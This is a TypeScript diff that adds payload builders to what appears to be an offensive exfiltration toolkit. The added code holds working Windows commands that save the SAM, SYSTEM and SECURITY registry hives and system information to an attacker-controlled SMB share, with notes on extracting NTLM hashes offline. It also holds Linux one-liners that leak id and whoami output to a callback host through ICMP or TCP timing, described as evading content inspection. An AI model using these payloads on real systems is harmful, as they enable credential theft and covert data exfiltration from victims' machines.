@@ -679,6 +679,52 @@ s.close()
   ];
 }
 
+
+export interface SmbExfilPayload {
+  id: string; name: string; category: string;
+  technique: string; os: "windows";
+  command: string; notes: string;
+}
+/** Dumps Windows secrets to attacker SMB share. Requires impacket smbserver.py. */
+export function buildSmbExfil(cbHost: string, token: string): SmbExfilPayload[] {
+  return [
+    {
+      id: "smb_sysinfo", name: "System info dump to SMB share", category: "Recon",
+      technique: "smb", os: "windows",
+      command: `net use \\\\${cbHost}\\share /user:guest "" 2>nul && (whoami /all & ipconfig /all & net user) > \\\\${cbHost}\\share\\${token}_info.txt 2>nul`,
+      notes: "Writes whoami+ipconfig+net user to attacker share. Run: impacket-smbserver share . -smb2support",
+    },
+    {
+      id: "smb_sam", name: "SAM+SYSTEM+SECURITY hive dump to SMB", category: "Credentials",
+      technique: "smb", os: "windows",
+      command: `net use \\\\${cbHost}\\share /user:guest "" 2>nul & reg save HKLM\\SAM \\\\${cbHost}\\share\\SAM_${token} /y 2>nul & reg save HKLM\\SYSTEM \\\\${cbHost}\\share\\SYS_${token} /y 2>nul & reg save HKLM\\SECURITY \\\\${cbHost}\\share\\SEC_${token} /y 2>nul`,
+      notes: "Dump SAM/SYSTEM/SECURITY hives. Use impacket secretsdump.py to extract NTLM hashes offline.",
+    },
+  ];
+}
+
+export interface TimingExfilPayload {
+  id: string; name: string; category: string; os: "linux";
+  command: string; notes: string;
+}
+/** Encodes data as inter-packet timing — evades all content inspection. */
+export function buildTimingExfil(cbHost: string): TimingExfilPayload[] {
+  return [
+    {
+      id: "timing_id_bits", name: "id output encoded as ICMP timing", category: "Covert",
+      os: "linux",
+      command: `DATA=$(id 2>/dev/null | xxd -b -c1 2>/dev/null | awk '{print $2}' | tr -d '\n'); for bit in $(echo "$DATA" | fold -w1); do if [ "$bit" = "1" ]; then ping -c1 -i0.05 ${cbHost} >/dev/null 2>&1; else sleep 0.15; fi; done`,
+      notes: "Bit 1=fast ICMP, bit 0=150ms sleep. Listener correlates ICMP intervals to decode bits. Works through firewalls that allow ICMP.",
+    },
+    {
+      id: "timing_tcp_encode", name: "whoami encoded as TCP connection timing", category: "Covert",
+      os: "linux",
+      command: `D=$(whoami 2>/dev/null | xxd -p 2>/dev/null | fold -w2); for byte in $D; do n=$((16#$byte)); sleep "0.$(printf '%03d' $n)" 2>/dev/null; curl -sk --connect-timeout 0.05 http://${cbHost}/ 2>/dev/null; done`,
+      notes: "Each byte becomes a 0-255ms sleep before TCP connection. Reconstruct by measuring inter-connection intervals.",
+    },
+  ];
+}
+
 export function buildAllExfilPayloads(cbUrl: string, token: string): ExfilPayload[] {
   return [
     ...buildHttpExfil(cbUrl, token),
